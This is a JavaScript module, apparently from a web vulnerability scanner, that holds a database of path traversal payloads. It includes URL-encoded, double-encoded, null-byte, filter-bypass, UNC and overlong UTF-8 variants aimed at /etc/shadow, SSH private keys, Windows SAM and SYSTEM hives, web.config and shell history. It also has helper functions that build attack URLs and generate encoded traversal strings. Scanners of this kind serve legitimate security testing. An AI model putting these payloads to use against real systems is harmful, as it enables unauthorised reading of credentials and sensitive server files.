// Path Traversal Payloads
// Comprehensive payload database for directory traversal attacks

const PathTraversalPayloads = {
    // Basic Path Traversal - Linux
    basicLinux: [
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../etc/shadow',
        '../../../etc/shadow',
        '../etc/hosts',
        '../../../etc/hosts',
        '../etc/hostname',
        '../etc/issue',
        '../proc/version',
        '../proc/self/environ'
    ],

    // Basic Path Traversal - Windows
    basicWindows: [
        '..\\Windows\\win.ini',
        '..\\..\\Windows\\win.ini',
        '..\\..\\..\\Windows\\win.ini',
        '..\\..\\..\\..\\Windows\\win.ini',
        '..\\..\\..\\..\\..\\Windows\\win.ini',
        '..\\..\\..\\..\\..\\..\\Windows\\win.ini',
        '..\\Windows\\System32\\drivers\\etc\\hosts',
        '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
        '..\\boot.ini',
        '..\\..\\boot.ini'
    ],

    // Absolute Paths - Linux
    absoluteLinux: [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/issue',
        '/etc/group',
        '/etc/resolv.conf',
        '/etc/ssh/sshd_config',
        '/proc/version',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/www/html/index.php',
        '/home/user/.ssh/id_rsa',
        '/root/.bash_history'
    ],

    // Absolute Paths - Windows
    absoluteWindows: [
        'C:\\Windows\\win.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\boot.ini',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\repair\\SAM',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\System32\\config\\SOFTWARE',
        'C:\\inetpub\\wwwroot\\web.config',
        'C:\\xampp\\apache\\conf\\httpd.conf'
    ],

    // URL Encoded
    urlEncoded: [
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fWindows%2fwin.ini',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%2f..%2f..%2fWindows%2fwin.ini',
        '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '..%2fetc%2fpasswd',
        '%2e%2e%2fetc%2fpasswd',
        '%2e%2e%5cetc%5cpasswd',
        '..%5c..%5c..%5cWindows%5cwin.ini'
    ],

    // Double URL Encoded
    doubleEncoded: [
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fWindows%252fwin.ini',
        '%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cwin.ini',
        '..%252f..%252f..%252fetc%252fpasswd'
    ],

    // Null Byte Injection
    nullByte: [
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.jpg',
        '../../../etc/passwd%00.png',
        '../../../etc/passwd%00.txt',
        '../../../Windows/win.ini%00',
        '../../../Windows/win.ini%00.jpg',
        '/etc/passwd%00',
        '/etc/passwd%00.jpg'
    ],

    // Stripped Bypass (for filters that remove ../)
    strippedBypass: [
        '....//....//....//etc/passwd',
        '....//....//....//Windows/win.ini',
        '..././..././..././etc/passwd',
        '..././..././..././Windows/win.ini',
        '.../.../.../.../etc/passwd',
        '....\\\\....\\\\....\\\\Windows\\win.ini',
        '..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini'
    ],

    // Nested Traversal
    nestedTraversal: [
        '....//....//....//....//etc/passwd',
        '....//....//....//....//Windows/win.ini',
        '..;/..;/..;/etc/passwd',
        '..;/..;/..;/Windows/win.ini'
    ],

    // UNC Paths (Windows)
    uncPaths: [
        '\\\\localhost\\c$\\Windows\\win.ini',
        '\\\\127.0.0.1\\c$\\Windows\\win.ini',
        '\\\\localhost\\c$\\boot.ini'
    ],

    // 16-bit Unicode Encoding
    unicode16: [
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd'
    ],

    // Overlong UTF-8 Encoding
    utf8Overlong: [
        '..%c0%2e..%c0%2e..%c0%2eetc/passwd',
        '..%e0%80%ae..%e0%80%ae..%e0%80%aeetc/passwd'
    ]
};

// Target Files
const TargetFiles = {
    linux: {
        passwd: '/etc/passwd',
        shadow: '/etc/shadow',
        hosts: '/etc/hosts',
        hostname: '/etc/hostname',
        issue: '/etc/issue',
        group: '/etc/group',
        resolv: '/etc/resolv.conf',
        sshConfig: '/etc/ssh/sshd_config',
        procVersion: '/proc/version',
        procEnviron: '/proc/self/environ',
        apacheLogs: '/var/log/apache2/access.log',
        nginxLogs: '/var/log/nginx/access.log',
        bashHistory: '/root/.bash_history'
    },
    windows: {
        winini: 'C:\\Windows\\win.ini',
        hosts: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
        bootini: 'C:\\boot.ini',
        sam: 'C:\\Windows\\System32\\config\\SAM',
        system: 'C:\\Windows\\System32\\config\\SYSTEM',
        webconfig: 'C:\\inetpub\\wwwroot\\web.config'
    }
};

// Helper functions
function getPayloadsByType(type, os = 'both') {
    let payloads = [];

    if (type === 'basic') {
        if (os === 'linux' || os === 'both') {
            payloads.push(...PathTraversalPayloads.basicLinux);
        }
        if (os === 'windows' || os === 'both') {
            payloads.push(...PathTraversalPayloads.basicWindows);
        }
    } else if (type === 'absolute') {
        if (os === 'linux' || os === 'both') {
            payloads.push(...PathTraversalPayloads.absoluteLinux);
        }
        if (os === 'windows' || os === 'both') {
            payloads.push(...PathTraversalPayloads.absoluteWindows);
        }
    } else if (type === 'encoding') {
        payloads.push(...PathTraversalPayloads.urlEncoded);
    } else if (type === 'doubleEncoding') {
        payloads.push(...PathTraversalPayloads.doubleEncoded);
    } else if (type === 'nullByte') {
        payloads.push(...PathTraversalPayloads.nullByte);
    } else if (type === 'stripped') {
        payloads.push(...PathTraversalPayloads.strippedBypass);
    }

    return payloads;
}

function getAllPathTraversalPayloads() {
    const allPayloads = [];
    Object.keys(PathTraversalPayloads).forEach(key => {
        if (Array.isArray(PathTraversalPayloads[key])) {
            allPayloads.push(...PathTraversalPayloads[key]);
        }
    });
    return allPayloads;
}

function getPayloadCount() {
    return getAllPathTraversalPayloads().length;
}

function buildPayloadURL(baseUrl, paramName, payload, method = 'GET') {
    if (method === 'GET') {
        const url = new URL(baseUrl);
        url.searchParams.set(paramName, payload);
        return url.toString();
    } else {
        return `${baseUrl} (POST: ${paramName}=${payload})`;
    }
}

function generateTraversalPayload(targetFile, depth = 3, encoding = 'none') {
    let traversal = '../'.repeat(depth);
    let payload = traversal + targetFile;

    if (encoding === 'url') {
        payload = payload.replace(/\.\./g, '%2e%2e').replace(/\//g, '%2f');
    } else if (encoding === 'double') {
        payload = payload.replace(/\.\./g, '%252e%252e').replace(/\//g, '%252f');
    }

    return payload;
}

function getTargetFilesByOS(os) {
    if (os === 'linux') {
        return Object.values(TargetFiles.linux);
    } else if (os === 'windows') {
        return Object.values(TargetFiles.windows);
    } else {
        return [...Object.values(TargetFiles.linux), ...Object.values(TargetFiles.windows)];
    }
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        PathTraversalPayloads,
        TargetFiles,
        getPayloadsByType,
        getAllPathTraversalPayloads,
        getPayloadCount,
        buildPayloadURL,
        generateTraversalPayload,
        getTargetFilesByOS
    };
}
